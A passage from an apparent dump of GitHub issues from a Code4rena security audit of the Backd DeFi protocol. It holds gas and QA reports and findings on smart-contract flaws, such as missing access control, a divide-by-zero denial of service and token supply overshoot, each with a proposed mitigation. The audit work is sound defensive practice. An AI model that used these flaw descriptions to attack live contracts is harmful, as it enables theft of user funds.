Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/VestedEscrow.sol:70:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:75:        require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/VestedEscrow.sol:76:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:81:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:82:        require(!initializedSupply, \"Supply already initialized once\"); tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, \"No reward tokens in contract\"); tokenomics/VestedEscrow.sol:90:        require(msg.sender == fundAdmin || msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:91:        require(initializedSupply, \"Supply must be initialized\"); tokenomics/VestedEscrowRevocable.sol:52:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrowRevocable.sol:53:        require(revokedTime[_recipient] == 0, \"Recipient already revoked\"); tokenomics/VestedEscrowRevocable.sol:54:        require(_recipient != treasury, \"Treasury cannot be revoked!\"); utils/Preparable.sol:28:        require(deadlines[key] == 0, Error.DEADLINE_NOT_ZERO); utils/Preparable.sol:29:        require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT); utils/Preparable.sol:86:        require(deadlines[key] != 0, Error.NOTHING_PENDING); utils/Preparable.sol:98:        require(deadlines[key] != 0, Error.NOTHING_PENDING); utils/Preparable.sol:110:        require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); utils/Preparable.sol:111:        require(deadline != 0, Error.DEADLINE_NOT_SET); zaps/PoolMigrationZap.sol:56:        require(lpTokenAmount_ != 0, \"No LP Tokens\"); zaps/PoolMigrationZap.sol:57:        require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, \"withdrawal fee not 0\"); AddressProvider.sol:64:        require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED); AddressProvider.sol:71:        require(_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_NOT_WHITELISTED); AddressProvider.sol:98:        require(pool != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:102:        require(poolToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:176:        require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:185:        require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:199:        require(exists, Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:241:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:242:        require(meta.freezable, Error.INVALID_ARGUMENT); AddressProvider.sol:260:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:270:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:295:        require(token != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:296:        require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS); AddressProvider.sol:325:        require(exists, Error.ADDRESS_NOT_FOUND); AddressProvider.sol:428:        require(!_addressKeyMetas.contains(key), Error.INVALID_ARGUMENT); AddressProvider.sol:434:        require(_addressKeyMetas.set(key, meta.toUInt()), Error.INVALID_ARGUMENT); BkdLocker.sol:59:        require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); BkdLocker.sol:119:        require( BkdLocker.sol:137:        require(length > 0, \"No entries\"); BkdLocker.sol:208:        require( Controller.sol:34:        require(address(inflationManager) == address(0), Error.ADDRESS_ALREADY_SET); Controller.sol:35:        require(_inflationManager != address(0), Error.INVALID_ARGUMENT); Controller.sol:82:        require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); CvxCrvRewardsLocker.sol:87:        require( CvxCrvRewardsLocker.sol:152:        require(_treasury != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); CvxCrvRewardsLocker.sol:195:        require(delegate != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); GasBank.sol:29:        require(account != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); GasBank.sol:46:        require(currentBalance != 0, Error.INSUFFICIENT_BALANCE); GasBank.sol:47:        require( GasBank.sol:73:        require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS); GasBank.sol:74:        require( GasBank.sol:81:            require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS); GasBank.sol:96:        require(success, Error.FAILED_TRANSFER); LpToken.sol:22:        require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); LpToken.sol:34:        require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); S"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "G-1 COMPARISONS WITH ZERO FOR UNSIGNED INTEGERS `>0` is less gas efficient than `!0` only if you enable optimizer and you're in a require statement.  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=require(amount%20%3E%200%2C%20Error.INVALID_AMOUNT)%3B  G-2 An length should be cached to save gas in for-loops Some of the for-loops in other contracts already have been doing this but the one below hasn't. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#:~:text=for%20(uint256%20i%3B%20i%20%3C%20actions.length%3B%20i%20%3D%20i.uncheckedInc())%20%7B   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/60", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "L-1 Maybe should have address(0) checks to avoid having to redeploy contracts https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=rewardToken%20%3D%20_rewardToken%3B  L-2 Missing checks for address when assigning values to address state variables https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=rewardToken%20%3D%20newRewardToken%3B  N-1 Multiple `addresss` mapping can be combined into a single mapping of an address to a struct. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=mapping(address,)%20public%20totalStashed%3B  N-2 Emit an event in setInflationRecipient()  The `setInflationRecipient()` function is operated only by the governerance and should emit an event when the inflationrecipient is set for the first time or changes. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#:~:text=function%20setInflationRecipient(,%7D  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "- `PoolMigrationZap.sol` - Use `UncheckedMath.uncheckedInc `instead of [++i in loop](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22)  - `FeeBurner.sol` - Use `calldata` instead of `memory` for read-only function argument array [`tokens_`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/58", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "**Redundant greater than 0 checks for uint** When executing pool weight changes in `InflationManager.sol` ([_executeKeeperPoolWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L575), [_executeLpPoolWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L589), [_executeAmmTokenWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L602)), corresponding total pool weights `x` are `unsigned int`. As they can't only be `x >= 0`, the expression `x>0 ? x : 0` does nothing.   **Sensible changes, such as adding a Governor should be a two-step process** [`addGovernance`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L41) directly grants `Roles.GOVERNANCE` to the `newGovernor`. It should be a two-step process (*e.g. [setGovernance](https://docs.yearn.finance/vaults/0.4.2/smart-contracts/registry#setgovernance)-[acceptGovernance](https://docs.yearn.finance/vaults/0.4.2/smart-contracts/registry#acceptgovernance)*) to ensure the input address is correct. Whilst `renounceGovernance` checks that there is at least one Governor left, in a single-Governor scenario, back to back execution of `addGovernance` with an incorrect address followed by `renounceGovernance` will render the protocol ungovernable. Additionally, as there is no way to revoke this role, granting governance to an address means that address will have complete control over the protocol forever after.  **Requirement uses external call to user-controlled address in [`PoolMigrationZap.sol - migrate`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52)** `require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, \"withdrawal fee not 0\");` makes an external call to `oldPoolAddress_`, which is a user-controlled address. It could be a malicious contract, thus reporting any result needed to bypass the guard.  **Erring on the safe side for reentrancy in [`PoolMigrationZap.sol - migrate`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52)** While I did not manage to exploit it in any way - I'd recommend against not including a `nonReentrant` guard in this function. `oldPoolAddress_` could be a malicious contract thus enabling multiple calls to `migrate` spanning from the external calls to `oldPool` or `lpToken_`.   **Recommended missing events** Modifying key protocol variables or triggering key events should always emit events accordingly to ensure transparency and proper traceability.  - [`Minter.sol`]( https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol): *setToken, startInflation,  executeInflationRateUpdate* - [`BkdLocker.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol): *migrate* - [`Controller.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol): *setInflationManager* - [`AmmGauge.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol): *kill* - [`KeeperGauge.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol): *kill, advanceEpoch, reportFees, poolCheckpoint* - [`InflationManager.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol): *deactivateWeightBasedKeeperDistribution, checkpointAllGauges* - [`VestedEscrow.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol): *setAdmin, setFundAdmin, initializeUnallocatedSupply*"}, {"title": "Missing access control in non-batched InflationManager execute funtions", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/56", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L145-L155 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L236-L249 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L321-L330   # Vulnerability details  ## Impact  Several actions need to be prepared and go through a time-lock before they can be executed. `InflationManager` allows anyone to call the single action execute function but requires `onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)` for the batched versions. This looks like an oversight since the same access control level should be enforced.  For example, the `executeLpPoolWeight` function allows anyone to call it:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L241-L249  ``` function executeLpPoolWeight(address lpToken) external override returns (uint256) {    (...) } ```   But the batched version enforces the caller to have `GOVERNANCE` or `INFLATION_MANAGER` roles:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L284-L301  ``` function batchExecuteLpPoolWeights(address[] calldata lpTokens)         external         override         onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)         returns (bool)     { ```  The same happens in `executeAmmTokenWeight` versus `batchExecuteAmmTokenWeights` , as well as `executeKeeperPoolWeight` versus `batchExecuteKeeperPoolWeights`.  If only trusted roles should be able to execute pending actions then the `onlyRoles` modifier should be added to the non-batched functions.  Scenarios where you would not want to allow anyone to execute could include potential votes/changes that may trigger a bug or undesired behavior noticed after it had already been approved.  ## Tools Used  vim  ## Recommended Mitigation Steps  Enforce the proper access control mechanism in non-batched execute functions.  "}, {"title": "KeeperGauge: When the Gauge is killed, the epoch can continue to increase, which may DOS the claimRewards function", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/51", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L157-L161   # Vulnerability details  ## Impact When the Gauge is killed, the advanceEpoch and kill functions can still be called to make epoch+1, while the reportFees function cannot be called to update the value of perPeriodTotalFees, which will cause perPeriodTotalFees[epoch] == 0. Later if the user calls the claimRewards function, the default epoch parameter will cause a divide by zero crash in the code below. ```` for (uint256 i = startEpoch; i < endEpoch; i = i.uncheckedInc()) {              totalClaimable += (                  keeperRecords[beneficiary].feesInPeriod[i].scaledDiv(perPeriodTotalFees[i])              ).scaledMul(perPeriodTotalInflation[i]);          } ```` ## Proof of Concept https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L157-L161 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L96-L100 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62 ## Tools Used None ## Recommended Mitigation Steps Require killed to be false in poolCheckpoint function ```     function poolCheckpoint() public override returns (bool) { -       if (killed) return false; +      require(!killed);         uint256 timeElapsed = block.timestamp - uint256(lastUpdated);         uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);         perPeriodTotalInflation[epoch] += currentRate * timeElapsed;         lastUpdated = uint48(block.timestamp);         return true;     } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/49", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## [Non-critical - 01] - In `Minter`, `currentInflationAmountLp`, `currentInflationAmountKeeper`, `currentInflationAmountAmm` could be made internal.  There are getters like `getLpInflationRate` for these variables, so there is no need to make them public as it just creates duplicates view functions.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## [Gas - 01] - `Gauges` could mint directly to `Minter` Currently all mint action pass through the `InflationManager` which checks the access control using the mapping `gauges` and then forward the call to the `Minter`: see [this code](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L78). It would be way more gas efficient considering the frequency of mints versus `gauges` mapping updates to maintain identical mappings in `InflationManager` and `Minter` and to mint directly to `Minter`.  This would just imply using an internal function in `InflationManager` to make sure each time `gauges` is updated it is also updated in `Minter`.   ## [Gas - 02] - In `Minter`, `token` could be made immutable  In [`Minter`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L55), `token` is not immutable but can only be set once. I assume this is for simplicity as you want to deploy `Minter`, `BkdToken` and then set the address of `BkdToken` in `Minter`. But this overhead could easily be avoided by pre-computing the deployment address of `BkdToken` so it could be set in the constructor of `Minter` and be immutable. This would save a lot of gas during the whole contract lifecycle.  To precompute deployment addresses, you can use the CREATE2 opcode: check https://docs.openzeppelin.com/cli/2.8/deploying-with-create2 or https://medium.com/coinmonks/pre-compute-contract-deployment-address-using-create2-8c01e80ab7da.  This also applies to other places in the code like https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L56   ## [Gas - 03] - In `Minter`, `currentInflationAmountLp`, `currentInflationAmountKeeper`, `currentInflationAmountAmm` could be made internal. There are getters like `getLpInflationRate` for these variables, so there is no need to make them public as it just creates duplicates view functions.   ## [Gas - 04] - `Minter` and `BkdToken` could be merged  To save expensive external calls, why not merging `Minter` and `BkdToken` into a single contract ? I think it doable from a contract size point of view, and references to one another are immutable so it would totally make sense to merge them.   ## [Gas - 05] In `VestedEscrow`, `totalTime` could be made immutable. [`totalTime`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L39) is not changed during the contract lifetime so could be made immutable !   ## [Gas - 06] In `Minter`, there is no need to inherit `ReentrancyGuard` In `Minter` the keyword `nonReentrant` is used only once [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L129), but it is useless as there is only an external call to a trusted contract: the token, and no crucial states updates after this call. "}, {"title": "Amount distributed can be inaccurate when updating weights ", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/47", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L220  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L559  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L572  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L586   # Vulnerability details   ## Impact  When updating pool inflation rates, other pools see their `currentRate` being modified without having `poolCheckpoint` called, which leads to false computations.  This will lead to either users losing a part of their claims, but can also lead to too many tokens could be distributed, preventing some users from claiming due to the `totalAvailableToNow` requirement in `Minter`.  ## Proof of concept  Imagine you have 2 AMM pools A and B, both with an `ammPoolWeight` of 100, where `poolCheckpoint` has not been called for a moment. Then, imagine calling [`executeAmmTokenWeight`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L318) to reduce the weight of A to 0.   Only A is checkpointed [here](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L591), so when B will be checkpointed it will call `getAmmRateForToken`, which will see a pool weight of 100 and a total weight of 100 over the whole period since the last checkpoint of B, which is false, therefore it will distribute too many tokens. This is critical has the minter expects an exact or lower than expected distribution due to the requirement of `totalAvailableToNow`.  In the opposite direction, when increasing weights, it will lead to less tokens being distributed in some pools than planned, leading to a loss for users.  ## Mitigation steps Checkpoint every `LpStakerVault`, `KeeperGauge` or `AmmGauge` when updating the weights of one of them.    "}, {"title": "Total Supply is not guaranteed and is not deterministic.", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/46", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code   https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181   # Vulnerability details  ## Impact The actual total supply of the token is random and depends on when `_executeInflationRateUpdate` is executed.  ## Proof of concept The `README` and tokenomic documentation clearly states that \u201cThe token supply is limited to a total of\u00a0268435456\u00a0tokens.\u201d. However when executing [`_executeInflationRateUpdate`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181), it first uses the current inflation rate to update the total available before checking if it needs to be reduced.   Therefore if no one mints or calls `executeInflationRateUpdate` for some time around the decay point, the inflation will be updated using the previous rate so the  `totalAvailableToNow` will grow too much.  ## Mitigation steps  You should do ```js\u2028 totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent)); ```  Only if the condition `block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD` is false.   Otherwise you should do   ```js\u2028 totalAvailableToNow += (currentTotalInflation * (lastInflationDecay + _INFLATION_DECAY_PERIOD - lastEvent));\u2028 ```  Then update the rates, then complete with ```js\u2028 totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastInflationDecay + _INFLATION_DECAY_PERIOD));\u2028 ```  Note that as all these variables are either constants either already loaded in memory this is super cheap to do.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Report  * [Low](#low)   * [L-01: use two-step process for critical address changes](#l-01-use-two-step-process-for-critical-address-changes) * [Non-Critical](#non-critical)   * [N-01: emit an event when changing the configuration of a contract](#n-01-emit-an-event-when-changing-the-configuration-of-a-contract)   * [N-02: AmmGauge doesn't use correct value for staking/unstaking events](#n-02-ammgauge-doesnt-use-correct-value-for-stakingunstaking-events)  # Low  ## L-01: use two-step process for critical address changes  Consider using a two-step process for transferring the ownership of a contract. While it costs a little more gas, it's safer than transferring directly.  Here's an example from the Compound Timelock contract: https://github.com/compound-finance/compound-protocol/blob/master/contracts/Timelock.sol#L45-L58  Relevant code sections: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68  # Non-Critical  ## N-01: emit an event when changing the configuration of a contract  There are multiple configuration functions that don't emit an event.  Relevant code: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L58 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L33  There're probably a couple more that I missed  ## N-02: AmmGauge doesn't use correct value for staking/unstaking events  The functions verify the number of tokens that were transferred. The value is used to keep track of the internal balances. But, it isn't used for the event. There you use the user specified `amount` parameter:  ```sol function stakeFor(address account, uint256 amount) public virtual override returns (bool) {     require(amount > 0, Error.INVALID_AMOUNT);      _userCheckpoint(account);      uint256 oldBal = IERC20(ammToken).balanceOf(address(this));     IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount);     uint256 newBal = IERC20(ammToken).balanceOf(address(this));     uint256 staked = newBal - oldBal;     balances[account] += staked;     totalStaked += staked;          // should be `staked` and not `amount`     emit AmmStaked(account, ammToken, amount);     return true; } ```  Relevant code: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L114 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L136"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/42", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Parameter validation is lacking zero-address check  ## Details Some of the function does not check for zero-address see reference: https://github.com/code-423n4/2021-06-pooltogether-findings/issues/81  # Mitigation check for zero-address input  # affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L117-L129 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L158-L170 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L253-L262 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L423-L436 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L70-L75 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L109-L111 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L336 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L71-L73 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L197-L210 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L218-L235 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L322-L349 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L359-L398 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L400-L402"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/40", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Solidity compiler will always read the length of the array during each iteration ## Details .length in a loop can be extracted into a variable and used where necessary to reduce the number of storage reads see reference: https://github.com/code-423n4/2021-10-union-findings/issues/92 ## Mitigation: This extra costs can be avoided by caching the array length.  Example: `uint rolesLength = roles.length;` `for (uint j = 0; i < rolesLength; ++j { }` ## affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  # `!=` is cheaper in gas compared to `>` for uint ## Details `!= 0` costs less gas compared to `> 0` for unsigned integers in require statements with the optimizer enabled (6 gas) see reference: https://github.com/code-423n4/2021-12-maple-findings/issues/75 ## Mitigation use `!= 0` instead of `> 0` ### affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91-L92 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  # Pre-increment cost less gas than post-increment ## Details `epoch++` costs more gas than `++epoch` , for uint pre-decrement is cheaper than post-decrement see reference: https://github.com/code-423n4/2021-12-nftx-findings/issues/195 ## Mitigation change `epoch++` to `++epoch` ### Affected code: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98"}, {"title": "DoS on KeeperGauge due to division by zero", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/35", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  